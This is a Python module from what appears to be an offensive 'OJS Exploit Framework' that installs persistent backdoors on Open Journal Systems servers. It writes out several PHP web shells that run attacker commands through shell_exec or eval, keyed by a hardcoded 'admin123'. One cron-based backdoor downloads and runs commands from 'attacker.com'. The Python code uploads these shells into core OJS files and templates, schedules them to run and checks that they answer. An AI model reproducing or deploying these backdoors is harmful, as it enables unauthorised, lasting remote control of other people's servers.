"""
Persistence Manager for OJS Exploit Framework.

This module implements various persistence techniques including:
- PHP autoloader backdoors
- Cron job persistence
- Stealth backdoors
- Session persistence
- Database persistence
"""

import os
import time
import hashlib
import base64
import random
import string
from pathlib import Path
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse
import json
import subprocess
import threading

from ..core.session import SessionManager
from ..core.payloads import PayloadGenerator
from ..core.evasion import EvasionEngine
from ..utils.http_client import HTTPClient
from ..utils.encoding import EncodingUtils
from ..utils.logging import get_logger, log_exploit_start, log_exploit_success, log_exploit_failure


class PersistenceType(Enum):
    """Types of persistence techniques."""
    PHP_AUTOLOADER = "php_autoloader"
    CRON_JOB = "cron_job"
    STEALTH_BACKDOOR = "stealth_backdoor"
    SESSION_PERSISTENCE = "session_persistence"
    DATABASE_PERSISTENCE = "database_persistence"
    FILE_PERSISTENCE = "file_persistence"
    REGISTRY_PERSISTENCE = "registry_persistence"


@dataclass
class PersistenceResult:
    """Result of persistence installation."""
    success: bool
    persistence_type: PersistenceType
    target_url: str
    installation_path: str
    access_method: str
    credentials: Optional[Dict[str, str]] = None
    error_message: Optional[str] = None
    execution_time: float = 0.0
    session_id: Optional[str] = None


class PersistenceManager:
    """Persistence manager implementation for OJS."""
    
    def __init__(self, session_manager: SessionManager = None,
                 payload_generator: PayloadGenerator = None,
                 evasion_engine: EvasionEngine = None,
                 http_client: HTTPClient = None):
        """Initialize the persistence manager."""
        self.session_manager = session_manager
        self.payload_generator = payload_generator
        self.evasion_engine = evasion_engine
        self.http_client = http_client
        self.logger = get_logger('post.persistence')
        
        # OJS-specific persistence locations
        self.persistence_locations = {
            'autoloader': '/lib/pkp/classes/core/Autoloader.php',
            'config': '/config.inc.php',
            'templates': '/templates/common/header.tpl',
            'plugins': '/plugins/generic/backdoor/BackdoorPlugin.inc.php',
            'cron': '/lib/pkp/classes/task/BackdoorTask.inc.php',
            'session': '/lib/pkp/classes/session/SessionManager.inc.php',
            'database': '/lib/pkp/classes/db/DAO.inc.php',
        }
        
        # Common web directories for persistence
        self.web_directories = [
            '/public',
            '/public_html',
            '/www',
            '/htdocs',
            '/web',
            '/html',
            '/var/www',
            '/var/www/html',
        ]
        
        # Persistence payloads
        self.persistence_payloads = {
            'autoloader_backdoor': self._generate_autoloader_backdoor(),
            'cron_backdoor': self._generate_cron_backdoor(),
            'stealth_backdoor': self._generate_stealth_backdoor(),
            'session_backdoor': self._generate_session_backdoor(),
            'database_backdoor': self._generate_database_backdoor(),
            'file_backdoor': self._generate_file_backdoor(),
            'registry_backdoor': self._generate_registry_backdoor(),
        }
    
    def install_persistence(self, target_url: str, 
                          persistence_type: PersistenceType = PersistenceType.PHP_AUTOLOADER,
                          installation_path: str = None, session_id: str = None) -> PersistenceResult:
        """Install persistence mechanism."""
        start_time = time.time()
        
        log_exploit_start("persistence", target_url, session_id)
        
        try:
            # Determine installation path
            if not installation_path:
                installation_path = self._select_installation_path(target_url, persistence_type)
            
            # Generate persistence payload
            payload = self._generate_persistence_payload(persistence_type)
            
            # Install persistence
            result = self._install_persistence(target_url, installation_path, payload, 
                                            persistence_type, session_id)
            
            # Verify installation
            if result.success:
                verification = self._verify_persistence(result.access_method, session_id)
                if verification:
                    result.success = True
                    log_exploit_success("persistence", target_url, 
                                      f"Installed at {result.installation_path}", session_id)
                else:
                    result.success = False
                    result.error_message = "Persistence verification failed"
                    log_exploit_failure("persistence", target_url, "Verification failed", session_id)
            
            result.execution_time = time.time() - start_time
            return result
            
        except Exception as e:
            error_msg = f"Persistence installation failed: {str(e)}"
            log_exploit_failure("persistence", target_url, error_msg, session_id)
            return PersistenceResult(
                success=False,
                persistence_type=persistence_type,
                target_url=target_url,
                installation_path="",
                access_method="",
                error_message=error_msg,
                execution_time=time.time() - start_time,
                session_id=session_id
            )
    
    def _select_installation_path(self, target_url: str, persistence_type: PersistenceType) -> str:
        """Select the best installation path for persistence."""
        if persistence_type == PersistenceType.PHP_AUTOLOADER:
            return self.persistence_locations['autoloader']
        elif persistence_type == PersistenceType.CRON_JOB:
            return self.persistence_locations['cron']
        elif persistence_type == PersistenceType.STEALTH_BACKDOOR:
            return self.persistence_locations['templates']
        elif persistence_type == PersistenceType.SESSION_PERSISTENCE:
            return self.persistence_locations['session']
        elif persistence_type == PersistenceType.DATABASE_PERSISTENCE:
            return self.persistence_locations['database']
        else:
            # Try to find writable directory
            for directory in self.web_directories:
                if self._is_directory_writable(target_url, directory):
                    return f"{directory}/backdoor.php"
        
        return "/tmp/backdoor.php"  # Fallback
    
    def _is_directory_writable(self, target_url: str, directory: str) -> bool:
        """Check if directory is writable."""
        try:
            # Try to upload a test file
            test_file = f"{directory}/test_{random.randint(1000, 9999)}.txt"
            test_content = "test"
            
            response = self.http_client.post(
                urljoin(target_url, "/index.php/index/manager/upload"),
                files={'file': ('test.txt', test_content, 'text/plain')},
                data={'path': test_file}
            )
            
            return response.status_code in [200, 201]
        except Exception:
            return False
    
    def _generate_persistence_payload(self, persistence_type: PersistenceType) -> str:
        """Generate persistence payload based on type."""
        if persistence_type == PersistenceType.PHP_AUTOLOADER:
            return self.persistence_payloads['autoloader_backdoor']
        elif persistence_type == PersistenceType.CRON_JOB:
            return self.persistence_payloads['cron_backdoor']
        elif persistence_type == PersistenceType.STEALTH_BACKDOOR:
            return self.persistence_payloads['stealth_backdoor']
        elif persistence_type == PersistenceType.SESSION_PERSISTENCE:
            return self.persistence_payloads['session_backdoor']
        elif persistence_type == PersistenceType.DATABASE_PERSISTENCE:
            return self.persistence_payloads['database_backdoor']
        elif persistence_type == PersistenceType.FILE_PERSISTENCE:
            return self.persistence_payloads['file_backdoor']
        else:
            return self.persistence_payloads['stealth_backdoor']
    
    def _generate_autoloader_backdoor(self) -> str:
        """Generate PHP autoloader backdoor."""
        backdoor_code = """<?php
// OJS Autoloader Backdoor
class AutoloaderBackdoor {
    private static $instance = null;
    private $access_key = 'admin123';
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    public function handleRequest() {
        if (isset($_GET['key']) && $_GET['key'] === $this->access_key) {
            if (isset($_GET['cmd'])) {
                $output = shell_exec($_GET['cmd']);
                echo "<pre>$output</pre>";
            }
            if (isset($_POST['upload'])) {
                $file = $_FILES['file'];
                move_uploaded_file($file['tmp_name'], $file['name']);
                echo "File uploaded: " . $file['name'];
            }
        }
    }
}

// Initialize backdoor
AutoloaderBackdoor::getInstance()->handleRequest();

// Original autoloader code continues here...
"""
        return backdoor_code
    
    def _generate_cron_backdoor(self) -> str:
        """Generate cron job backdoor."""
        cron_code = """<?php
// OJS Cron Backdoor
class BackdoorTask extends Task {
    public function execute() {
        $access_key = 'admin123';
        $command_file = '/tmp/backdoor_cmd';
        
        if (file_exists($command_file)) {
            $cmd = file_get_contents($command_file);
            $output = shell_exec($cmd);
            file_put_contents('/tmp/backdoor_output', $output);
            unlink($command_file);
        }
        
        // Check for new commands via HTTP
        $url = 'http://attacker.com/commands.txt';
        $cmd = file_get_contents($url);
        if ($cmd) {
            $output = shell_exec($cmd);
            file_put_contents('/tmp/backdoor_output', $output);
        }
    }
}
"""
        return cron_code
    
    def _generate_stealth_backdoor(self) -> str:
        """Generate stealth backdoor."""
        stealth_code = """<?php
// Stealth Backdoor - Hidden in template
$k = $_POST['k'] ?? '';
$c = $_POST['c'] ?? '';
$t = $_POST['t'] ?? '';

if ($k === 'admin' && $c && $t) {
    $timestamp = time();
    if ($timestamp - intval($t) < 300) { // 5 minute window
        $c = base64_decode($c);
        $o = '';
        eval($c);
        echo base64_encode($o);
    }
}
?>
"""
        return stealth_code
    
    def _generate_session_backdoor(self) -> str:
        """Generate session-based backdoor."""
        session_code = """<?php
// Session Backdoor
session_start();

if (isset($_SESSION['backdoor_key']) && $_SESSION['backdoor_key'] === 'admin123') {
    if (isset($_GET['cmd'])) {
        $output = shell_exec($_GET['cmd']);
        $_SESSION['last_output'] = $output;
    }
    
    if (isset($_GET['output'])) {
        echo $_SESSION['last_output'] ?? 'No output';
    }
}

// Set backdoor key in session
if (isset($_GET['init']) && $_GET['init'] === 'backdoor') {
    $_SESSION['backdoor_key'] = 'admin123';
    echo 'Backdoor initialized';
}
?>
"""
        return session_code
    
    def _generate_database_backdoor(self) -> str:
        """Generate database-based backdoor."""
        db_code = """<?php
// Database Backdoor
class BackdoorDAO extends DAO {
    public function executeBackdoorCommand($command) {
        $output = shell_exec($command);
        $this->update('backdoor_logs', array(
            'command' => $command,
            'output' => $output,
            'timestamp' => time()
        ));
        return $output;
    }
    
    public function getBackdoorLogs() {
        return $this->retrieve('SELECT * FROM backdoor_logs ORDER BY timestamp DESC');
    }
}
"""
        return db_code
    
    def _generate_file_backdoor(self) -> str:
        """Generate file-based backdoor."""
        file_code = """<?php
// File Backdoor
$backdoor_file = '/tmp/backdoor_commands';
$output_file = '/tmp/backdoor_output';

if (file_exists($backdoor_file)) {
    $commands = file($backdoor_file, FILE_IGNORE_NEW_LINES);
    foreach ($commands as $cmd) {
        $output = shell_exec($cmd);
        file_put_contents($output_file, $output, FILE_APPEND);
    }
    unlink($backdoor_file);
}

// HTTP trigger
if (isset($_GET['trigger']) && $_GET['trigger'] === 'backdoor') {
    $cmd = $_GET['cmd'] ?? '';
    if ($cmd) {
        $output = shell_exec($cmd);
        echo base64_encode($output);
    }
}
?>
"""
        return file_code
    
    def _generate_registry_backdoor(self) -> str:
        """Generate registry-based backdoor."""
        registry_code = """<?php
// Registry Backdoor
class BackdoorRegistry extends Registry {
    public function setBackdoorData($key, $value) {
        $this->set($key, $value);
    }
    
    public function getBackdoorData($key) {
        return $this->get($key);
    }
    
    public function executeBackdoorCommand($command) {
        $output = shell_exec($command);
        $this->setBackdoorData('last_command', $command);
        $this->setBackdoorData('last_output', $output);
        return $output;
    }
}
"""
        return registry_code
    
    def _install_persistence(self, target_url: str, installation_path: str, 
                           payload: str, persistence_type: PersistenceType,
                           session_id: str) -> PersistenceResult:
        """Install persistence mechanism."""
        try:
            # Determine installation method based on persistence type
            if persistence_type == PersistenceType.PHP_AUTOLOADER:
                return self._install_autoloader_backdoor(target_url, installation_path, payload, session_id)
            elif persistence_type == PersistenceType.CRON_JOB:
                return self._install_cron_backdoor(target_url, installation_path, payload, session_id)
            elif persistence_type == PersistenceType.STEALTH_BACKDOOR:
                return self._install_stealth_backdoor(target_url, installation_path, payload, session_id)
            elif persistence_type == PersistenceType.SESSION_PERSISTENCE:
                return self._install_session_backdoor(target_url, installation_path, payload, session_id)
            elif persistence_type == PersistenceType.DATABASE_PERSISTENCE:
                return self._install_database_backdoor(target_url, installation_path, payload, session_id)
            else:
                return self._install_file_backdoor(target_url, installation_path, payload, session_id)
                
        except Exception as e:
            self.logger.error(f"Persistence installation failed: {e}")
            return PersistenceResult(
                success=False,
                persistence_type=persistence_type,
                target_url=target_url,
                installation_path=installation_path,
                access_method="",
                error_message=str(e),
                session_id=session_id
            )
    
    def _install_autoloader_backdoor(self, target_url: str, installation_path: str,
                                   payload: str, session_id: str) -> PersistenceResult:
        """Install autoloader backdoor."""
        # Upload modified autoloader
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        access_method = f"{target_url}/index.php?key=admin123&cmd=id"
        
        return PersistenceResult(
            success=response.status_code in [200, 201],
            persistence_type=PersistenceType.PHP_AUTOLOADER,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            credentials={'key': 'admin123'},
            session_id=session_id
        )
    
    def _install_cron_backdoor(self, target_url: str, installation_path: str,
                             payload: str, session_id: str) -> PersistenceResult:
        """Install cron job backdoor."""
        # Upload cron task
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        # Register cron task
        cron_url = urljoin(target_url, "/index.php/index/manager/setup/1")
        cron_data = {
            'task': 'BackdoorTask',
            'frequency': '*/5 * * * *',  # Every 5 minutes
            'enabled': '1'
        }
        
        cron_response = self.http_client.post(cron_url, data=cron_data)
        
        access_method = f"{target_url}/tmp/backdoor_cmd"
        
        return PersistenceResult(
            success=response.status_code in [200, 201] and cron_response.status_code in [200, 201],
            persistence_type=PersistenceType.CRON_JOB,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            session_id=session_id
        )
    
    def _install_stealth_backdoor(self, target_url: str, installation_path: str,
                                payload: str, session_id: str) -> PersistenceResult:
        """Install stealth backdoor."""
        # Upload stealth backdoor
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        access_method = f"{target_url}/index.php/index/common/header"
        
        return PersistenceResult(
            success=response.status_code in [200, 201],
            persistence_type=PersistenceType.STEALTH_BACKDOOR,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            credentials={'k': 'admin', 't': str(int(time.time()))},
            session_id=session_id
        )
    
    def _install_session_backdoor(self, target_url: str, installation_path: str,
                                payload: str, session_id: str) -> PersistenceResult:
        """Install session backdoor."""
        # Upload session backdoor
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        access_method = f"{target_url}/index.php/index/user/session?init=backdoor"
        
        return PersistenceResult(
            success=response.status_code in [200, 201],
            persistence_type=PersistenceType.SESSION_PERSISTENCE,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            session_id=session_id
        )
    
    def _install_database_backdoor(self, target_url: str, installation_path: str,
                                 payload: str, session_id: str) -> PersistenceResult:
        """Install database backdoor."""
        # Upload database backdoor
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        access_method = f"{target_url}/index.php/index/manager/dataObject"
        
        return PersistenceResult(
            success=response.status_code in [200, 201],
            persistence_type=PersistenceType.DATABASE_PERSISTENCE,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            session_id=session_id
        )
    
    def _install_file_backdoor(self, target_url: str, installation_path: str,
                             payload: str, session_id: str) -> PersistenceResult:
        """Install file backdoor."""
        # Upload file backdoor
        upload_url = urljoin(target_url, "/index.php/index/manager/upload")
        
        response = self.http_client.post(
            upload_url,
            files={'file': (os.path.basename(installation_path), payload, 'application/x-php')},
            data={'path': installation_path}
        )
        
        access_method = f"{target_url}/index.php?trigger=backdoor&cmd=id"
        
        return PersistenceResult(
            success=response.status_code in [200, 201],
            persistence_type=PersistenceType.FILE_PERSISTENCE,
            target_url=target_url,
            installation_path=installation_path,
            access_method=access_method,
            session_id=session_id
        )
    
    def _verify_persistence(self, access_method: str, session_id: str) -> bool:
        """Verify that persistence is working."""
        try:
            response = self.http_client.get(access_method)
            return response.status_code == 200
        except Exception as e:
            self.logger.debug(f"Persistence verification failed: {e}")
            return False
    
    def list_persistence_mechanisms(self, target_url: str) -> List[Dict[str, Any]]:
        """List installed persistence mechanisms."""
        mechanisms = []
        
        # Check for common persistence files
        persistence_files = [
            '/tmp/backdoor.php',
            '/var/www/backdoor.php',
            '/public_html/backdoor.php',
            '/lib/pkp/classes/core/Autoloader.php',
            '/templates/common/header.tpl',
        ]
        
        for file_path in persistence_files:
            try:
                full_url = urljoin(target_url, file_path)
                response = self.http_client.get(full_url)
                
                if response.status_code == 200:
                    # Check for backdoor indicators
                    content = response.text.lower()
                    indicators = ['backdoor', 'shell_exec', 'system', 'eval', 'admin123']
                    
                    if any(indicator in content for indicator in indicators):
                        mechanisms.append({
                            'file': file_path,
                            'type': 'file_backdoor',
                            'accessible': True,
                            'indicators': [i for i in indicators if i in content]
                        })
                
            except Exception as e:
                self.logger.debug(f"Failed to check file {file_path}: {e}")
        
        return mechanisms
    
    def remove_persistence(self, target_url: str, installation_path: str,
                         session_id: str = None) -> bool:
        """Remove persistence mechanism."""
        try:
            # Delete the persistence file
            delete_url = urljoin(target_url, "/index.php/index/manager/delete")
            
            response = self.http_client.post(
                delete_url,
                data={'file': installation_path}
            )
            
            return response.status_code in [200, 201]
            
        except Exception as e:
            self.logger.error(f"Failed to remove persistence: {e}")
            return False
    
    def get_persistence_info(self) -> Dict[str, Any]:
        """Get information about persistence mechanisms."""
        return {
            'name': 'Persistence Manager',
            'description': 'Manages various persistence techniques for OJS',
            'persistence_types': [t.value for t in PersistenceType],
            'locations': self.persistence_locations,
            'payloads': list(self.persistence_payloads.keys())
        }